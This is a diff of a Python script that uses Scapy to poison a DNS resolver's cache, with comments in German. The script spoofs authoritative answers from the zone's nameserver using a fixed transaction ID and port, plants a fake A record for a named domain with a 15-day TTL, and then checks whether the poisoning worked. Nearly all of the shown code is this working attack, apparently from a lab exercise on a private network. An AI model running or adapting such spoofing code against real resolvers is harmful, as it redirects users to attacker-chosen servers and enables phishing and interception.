@@ -3,21 +3,21 @@
 from scapy.all import *
 import threading, socket
 
-victim_url = 'danielfett.de'
-victim_ns = '192.168.1.2'
+bad_guy = '192.168.1.249' # unsere ip addresse (fuer anfrage)
+fake_ip = '195.71.11.67' # das was wir dem cache infizieren wollen
 
-target_ip = '195.71.11.67'
-bad_guy = '192.168.1.249'
-
+victim_url = 'danielfett.de'  # url dessen cache gepoisened werden soll
+victim_ns = '192.168.1.2'     # nameserver der angegeriffen wird
 fix_dns_id = 0x0042
 fix_port = 32772
 dns_ttl = 60*60*24*15 
-dns_qd=DNSQR(qname=victim_url,qtype='A',qclass='IN')
-dns_qd_ns=DNSQR(qname=victim_url,qtype='NS',qclass='IN')
+
+dns_qd=DNSQR(qname=victim_url,qtype='A',qclass='IN')        # querry data fuer die anfrage
+dns_qd_ns=DNSQR(qname=victim_url,qtype='NS',qclass='IN')    # querry data fuer die zone_ns anfrage
 
 #dynamisch ermittelt:
-global zone_ns
-global zone_ns_url
+global zone_ns           # nameserver_ip von victim_url
+global zone_ns_url       # url von zone_ns
 
 def sendRequest():
     
@@ -25,7 +25,7 @@ def sendRequest():
     
     while ( True ):
         request = Ether()/IP(dst=victim_ns,src=bad_guy,flags=2)/UDP(dport=53,sport=53)/DNS(id=1337,qr=0,rd=1,qd=dns_qd)
-        dns = Ether()/IP(dst=victim_ns, src=zone_ns)/UDP(dport=fix_port, sport=53)/DNS(id=fix_dns_id, rd=1, qr=1, aa=1, qd=dns_qd, an = DNSRR(type='A',rrname=victim_url, ttl=dns_ttl, rdata=target_ip) )
+        dns = Ether()/IP(dst=victim_ns, src=zone_ns)/UDP(dport=fix_port, sport=53)/DNS(id=fix_dns_id, rd=1, qr=1, aa=1, qd=dns_qd, an = DNSRR(type='A',rrname=victim_url, ttl=dns_ttl, rdata=fake_ip) )
         pkt_list=[]
         pkt_list.append(request)
         print 'Cache Poisoning auf '+victim_url+' ...'
@@ -81,7 +81,7 @@ def check_cache():
     #adns.show()
    
     if adns.an != None:
-        if(adns.an.rdata==target_ip):  
+        if(adns.an.rdata==fake_ip):  
             print "Cache erfolgreich vergiftet. IP = "+adns.an.rdata      
             return 1
         else:
